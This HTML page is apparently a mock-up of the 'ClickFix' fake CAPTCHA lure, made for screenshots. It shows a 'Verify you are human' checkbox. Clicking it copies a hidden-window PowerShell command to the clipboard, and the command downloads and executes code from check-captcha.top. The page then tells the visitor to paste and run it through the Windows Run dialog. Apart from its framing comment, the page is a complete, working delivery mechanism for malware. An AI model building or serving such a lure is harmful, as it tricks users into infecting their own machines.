<!doctype html>
<!-- A fake "verify you are human" page (the ClickFix trick) for the store
     screenshots. Clicking the button puts a command on the clipboard, the way
     the real ones do. Served over HTTPS so the clipboard works. -->
<html lang="en"><head><meta charset="utf-8"><title>Just a moment...</title>
<style>
  * { box-sizing: border-box; }
  body { margin: 0; min-height: 100vh; background: #fff; color: #222;
    font: 15px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
  .wrap { max-width: 640px; margin: 0 auto; padding: 72px 24px; }
  h1 { font-size: 30px; font-weight: 500; margin: 0 0 6px; }
  .host { color: #555; margin: 0 0 30px; }
  .box { display: flex; align-items: center; gap: 14px; width: 300px; border: 1px solid #DDD; background: #FAFAFA;
    padding: 16px 18px; border-radius: 4px; }
  #v { width: 26px; height: 26px; border: 2px solid #999; background: #fff; border-radius: 3px; cursor: pointer; padding: 0; }
  .steps { margin-top: 26px; border: 1px solid #DDD; border-radius: 6px; padding: 18px 22px; max-width: 460px; display: none; }
  .steps.on { display: block; }
  .steps b { display: block; margin-bottom: 8px; }
  kbd { display: inline-block; border: 1px solid #CCC; border-bottom-width: 2px; border-radius: 4px; padding: 0 7px;
    font: 13px/22px -apple-system, sans-serif; background: #fff; }
  ol { margin: 0; padding-left: 20px; } li { margin: 6px 0; }
</style></head>
<body><div class="wrap">
  <h1>Verify you are human</h1>
  <p class="host">This site needs to check that your connection is secure before you continue.</p>
  <div class="box"><button id="v" aria-label="I'm not a robot"></button><span>I'm not a robot</span></div>
  <div class="steps" id="s">
    <b>Complete these verification steps</b>
    <ol>
      <li>Press <kbd>⊞ Windows</kbd> + <kbd>R</kbd></li>
      <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd></li>
      <li>Press <kbd>Enter</kbd></li>
    </ol>
  </div>
</div>
<script>
  document.getElementById('v').onclick = function () {
    navigator.clipboard.writeText('powershell -w h -c "iex(irm https://check-captcha.top/a)"');
    document.getElementById('s').classList.add('on');
  };
</script>
</body></html>
